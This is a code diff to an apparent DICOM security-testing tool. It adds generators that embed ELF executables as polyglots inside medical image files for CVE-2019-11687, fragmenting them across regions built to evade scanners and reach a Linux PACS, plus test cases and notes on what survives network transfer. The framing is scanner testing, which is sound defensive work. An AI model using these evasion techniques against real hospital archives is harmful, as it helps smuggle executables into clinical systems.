@@ -121,8 +121,10 @@ from .element import Element, Dataset, Tag, VR
 from .corruptor import Corruptor, Override, Injection, InjectionPoint
 from .pixel import EncapsulatedPixelData, Fragment
 from .file import DicomFile
+from .monitor import ProtocolMonitor
 from .polyglot import (
-    FILE_ALIGNMENT, align_up, dos_header, dos_stub, elf_header, elf_image,
+    ELF_HEADER_LEN, ELF_PHDR_LEN, ELF_TYPE_DYN, ELF_TYPE_EXEC, FILE_ALIGNMENT,
+    align_up, dos_header, dos_stub, elf_fragments, elf_header, elf_image,
     embed_in_carrier, filler, inspect_carrier, macho_header, macho_image,
     pe_fragments, pe_headers_len, pe_image, shannon_entropy,
 )
@@ -4555,6 +4557,130 @@ class CVEAttacks:
         return payload, fragments
 
     @staticmethod
+    def _fragmented_elfdicom(bits: int = 64
+                             ) -> Tuple[bytes, List[Dict[str, Any]]]:
+        """An ELF split across four regions, one of which no PE can use.
+
+        The PE fragmentation payload had to leave the preamble's DOS-stub zone
+        empty: a PE section must start on a 512-byte ``FileAlignment``
+        boundary at or past ``SizeOfHeaders``, and bytes 0x40-0x7F satisfy
+        neither. ELF has no such rule — a ``PT_LOAD`` may begin at any file
+        offset provided ``p_vaddr`` agrees with it modulo the page size — so
+        the same 64 bytes hold a real segment here.
+
+        That is the concrete reason a scanner cannot reuse its PE reasoning:
+        the regions worth searching are not the same regions, and the ELF set
+        is strictly larger.
+
+        Layout: header at 0, one segment in the preamble tail, the program
+        header table in a private element, a second segment in an element's
+        padding tail, and a third past the end of the Data Set.
+        """
+        head = CVEAttacks._polyglot_head_len()
+        identity = CVEAttacks._polyglot_identity()
+        patient = CVEAttacks._polyglot_patient()
+        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
+            implicit_vr=False, little_endian=True)
+        long_form = CVEAttacks._LONG_FORM_HEADER_LEN
+        phdr_len = ELF_PHDR_LEN[bits]
+        header_len = ELF_HEADER_LEN[bits]
+
+        # Segment A: the preamble bytes the ELF header does not occupy.
+        stub_offset = header_len
+        stub_size = PART10_PREAMBLE_LEN - header_len
+
+        # The program header table, in a private OB element.
+        table_value_start = (head + len(identity) + len(creator) + long_form)
+        pad = -table_value_start % 8      # natural alignment of the phdr fields
+        table_offset = table_value_start + pad
+        table_len = 3 * phdr_len
+        table_value_len = pad + table_len
+        table_value_len += table_value_len % 2
+        after_table = table_value_start + table_value_len
+
+        # Segment B: the padding tail of a second private element. No
+        # alignment maths — ELF takes the offset as it falls.
+        content = b'VENDORCFG\x00'
+        b_value_start = after_table + long_form
+        seg_b_offset = b_value_start + len(content)
+        seg_b_size = 0x100
+        after_b = b_value_start + len(content) + seg_b_size
+
+        # Segment C: past the final Data Element.
+        seg_c_offset = after_b + len(patient)
+        seg_c_size = 0x100
+
+        table, (seg_a, seg_b, seg_c) = elf_fragments(
+            table_offset,
+            [(stub_offset, stub_size), (seg_b_offset, seg_b_size),
+             (seg_c_offset, seg_c_size)],
+            bits=bits)
+
+        carriers = (
+            Element(0x0009, 0x1001, 'OB', b'\x00' * pad + table),
+            Element(0x0009, 0x1002, 'UN', content + seg_b),
+        )
+        payload = CVEAttacks._polyglot_part10(
+            preamble=elf_header(table_offset, ph_count=3, bits=bits) + seg_a,
+            insert=creator + b''.join(
+                c.encode(implicit_vr=False, little_endian=True)
+                for c in carriers),
+            trailing=seg_c,
+        )
+
+        fragments = [
+            {'zone': 'preamble_dos_stub', 'offset': stub_offset,
+             'length': stub_size,
+             'part': 'PT_LOAD 0 — a region no PE section can occupy'},
+            {'zone': 'private_element', 'offset': table_offset,
+             'length': table_len, 'part': 'program header table'},
+            {'zone': 'element_padding', 'offset': seg_b_offset,
+             'length': seg_b_size, 'part': 'PT_LOAD 1'},
+            {'zone': 'trailing', 'offset': seg_c_offset,
+             'length': seg_c_size, 'part': 'PT_LOAD 2'},
+        ]
+        for fragment in fragments:
+            end = fragment['offset'] + fragment['length']
+            assert end <= len(payload), (fragment, len(payload))
+        return payload, fragments
+
+    @staticmethod
+    def _elfdicom_on_carrier(bits: int = 64, fill: str = 'strings',
+                             segment_size: int = 0x400,
+                             elf_type: int = ELF_TYPE_EXEC
+                             ) -> Tuple[bytes, Dict[str, Any]]:
+        """ELFDICOM embedded in a complete Secondary Capture image.
+
+        The Linux counterpart of :meth:`_pedicom_on_carrier`, and the payload
+        to reach for against a Linux PACS: an object the archive accepts on
+        IOD grounds, which a ``file(1)``/``binfmt_elf`` magic check also calls
+        an ELF executable. Only the preamble is replaced — the ELF header
+        fits the first 64 bytes exactly — so the image still renders.
+        """
+        host = secondary_capture_carrier()
+        before = inspect_carrier(host)
+        data, offset = embed_in_carrier(
+            host,
+            lambda at: elf_image(at, bits=bits, segment_size=segment_size,
+                                 fill=fill),
+            align=8,
+            preamble=lambda at: elf_header(
+                at, ph_count=1, bits=bits, elf_type=elf_type).ljust(
+                    PART10_PREAMBLE_LEN, b'\x00'),
+        )
+        after = inspect_carrier(data)
+        return data, {
+            'ph_offset': offset,
+            'elf_bits': bits,
+            'elf_type': 'ET_DYN' if elf_type == ELF_TYPE_DYN else 'ET_EXEC',
+            'carrier_sop_instance_uid': after.sop_instance_uid,
+            'carrier_pixel_data_offset': after.pixel_data_offset,
+            'carrier_pixel_data_bytes': after.pixel_data_length,
+            'carrier_pixel_data_intact':
+                before.pixel_data_length == after.pixel_data_length,
+        }
+
+    @staticmethod
     def _elfdicom(bits: int = 64, segment_size: int = 0x200) -> bytes:
         """The ELF counterpart of :meth:`_pedicom`, with ELF's own rules.
 
@@ -5098,6 +5224,109 @@ class CVEAttacks:
                           'carrier': 'secondary_capture_image',
                           **container_meta}
             ))
+
+        # Tests 19-22: ELF coverage to match the PE side, for a Linux target.
+        # Until now ELF had two payloads to PE's ten, so a Linux PACS or
+        # scanner was being tested against a fraction of the surface.
+
+        # 19: the ELF32 variant of test 12. Elf32_Phdr orders its fields
+        # differently from Elf64_Phdr — p_flags is last rather than second —
+        # so a reader that handles one layout and assumes the other reads
+        # segment permissions out of the wrong offset.
+        results.append(AttackResult(
+            name='cve_2019_11687_19_elf32_private_element',
+            category='cve',
+            payload=CVEAttacks._elfdicom(bits=32),
+            description='ELFDICOM with a 32-bit ELF whose program header '
+                        'table and PT_LOAD live in a private OB element',
+            expected_behavior='Scanner should follow e_phoff regardless of ELF '
+                              'class; Elf32_Phdr is not Elf64_Phdr with '
+                              'smaller fields',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
+                      'zone': 'private_element', 'elf_bits': 32}
+        ))
+
+        # 20: ELF fragmentation, which reaches a region the PE version cannot.
+        # See CVEAttacks._fragmented_elfdicom.
+        elf_fragged, elf_frags = CVEAttacks._fragmented_elfdicom()
+        results.append(AttackResult(
+            name='cve_2019_11687_20_elf_fragmented_zones',
+            category='cve',
+            payload=elf_fragged,
+            description='ELF split across the preamble tail, a private '
+                        'element, an element padding tail and the trailing '
+                        'region',
+            expected_behavior='Scanner should follow the program header table '
+                              'rather than match a contiguous image, and must '
+                              'not assume PE alignment rules bound where an '
+                              'ELF segment can sit',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
+                      'zone': 'fragmented', 'elf_bits': 64,
+                      'fragments': elf_frags}
+        ))
+
+        # 21 and 22: ELF on an object a PACS will actually keep — the Linux
+        # counterpart of test 16. ET_DYN ships alongside ET_EXEC because
+        # modern Linux toolchains emit PIE binaries as shared objects, and
+        # file(1) reports them differently; a scanner keyed on 'ELF
+        # executable' misses every PIE on the system.
+        for suffix, name, elf_type in (
+                ('21', 'elf_in_storable_image', ELF_TYPE_EXEC),
+                ('22', 'elf_pie_in_storable_image', ELF_TYPE_DYN)):
+            carried_elf, elf_meta = CVEAttacks._elfdicom_on_carrier(
+                elf_type=elf_type)
+            results.append(AttackResult(
+                name=f'cve_2019_11687_{suffix}_{name}',
+                category='cve',
+                payload=carried_elf,
+                description=f'ELFDICOM ({elf_meta["elf_type"]}) embedded in a '
+                            'complete Secondary Capture object that still '
+                            'renders its image',
+                expected_behavior='PACS should reject or strip the executable; '
+                                  'a rejection here is about the payload, not '
+                                  'about an incomplete object',
+                metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
+                          'zone': 'private_element',
+                          'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                          'sop_instance_uid': elf_meta[
+                              'carrier_sop_instance_uid'],
+                          'carrier': 'secondary_capture_image',
+                          **elf_meta}
+            ))
+
+        # Which of these survive the wire, and which are file-only.
+        #
+        # C-STORE carries a Data Set. The 128-byte preamble is a *file*
+        # construct that PS3.10 defines outside the Data Set, so it is never
+        # transmitted — the receiving SCP writes its own, zeroed. Bytes past
+        # the final Data Element are outside the Data Set too and go the same
+        # way. Measured against a pynetdicom Storage SCP: every payload whose
+        # foreign content lives in the preamble or the trailing region arrives
+        # as an ordinary object with nothing in it, and the fragmented ones do
+        # not decode as a Data Set at all.
+        #
+        # The consequence is worth stating plainly: **no executable polyglot
+        # survives C-STORE as a loadable image**, because MZ, \x7fELF and the
+        # Mach-O magic all sit at offset 0, and e_lfanew sits at 0x3C. What
+        # does survive is whatever is inside a Data Element — the PE headers
+        # and section data in a private element, the container blob, the
+        # padding-tail payload. Those reach the archive intact.
+        #
+        # So only the payloads whose mechanism actually arrives are scored on
+        # acceptance. Tagging the rest would report a finding against an
+        # archive that received an ordinary image, which is the false positive
+        # this catalog is supposed to avoid producing.
+        SURVIVES_CSTORE = {'private_element', 'element_padding'}
+        for result in results:
+            survives = result.metadata.get('zone') in SURVIVES_CSTORE
+            result.metadata['survives_cstore'] = survives
+            if survives:
+                result.metadata.setdefault('finding_on',
+                                           ProtocolMonitor.FINDING_ON_STORE)
+            else:
+                # Deliver these as files: `c-scare corpus -o ./out` and an
+                # import path, media, or a DICOMDIR — not over an association.
+                result.metadata.setdefault('delivery_scope', 'file')
 
         return results
 
